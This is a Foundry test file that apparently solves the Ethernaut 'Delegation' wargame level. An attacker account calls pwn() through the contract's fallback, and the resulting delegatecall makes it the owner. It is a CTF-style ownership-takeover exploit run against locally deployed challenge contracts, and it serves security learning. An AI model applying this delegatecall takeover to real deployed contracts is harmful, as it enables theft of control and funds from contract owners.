// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Delegation, Delegate} from "../src/Level6.sol";

contract CounterTest is Test {
    Delegate public delegate;
    Delegation public delegation;
    address public alice;
    address public bob;

    function setUp() public {
        alice = makeAddr("alice");
        vm.deal(alice, 1 ether);
        bob = makeAddr("bob");
        vm.startPrank(bob);
        delegate = new Delegate(bob);
        delegation = new Delegation(address(delegate));
        vm.stopPrank();
    }

    function test_ClaimOwnership() public {
        console.log("Bob address: ", bob);
        console.log("Alice address: ", alice);
        console.log("-----------");
        console.log("Current Delegate contract owner (Bob): ", address(delegation.owner()));
        console.log("---Alice executing fallback() function---");
        vm.prank(alice);
        bytes memory data = abi.encodeWithSignature("pwn()");
        (bool success, bytes memory returnData ) = address(delegation).call(data);
        console.log("Current Delegate contract owner (Alice): ", address(delegation.owner()));
    }
}
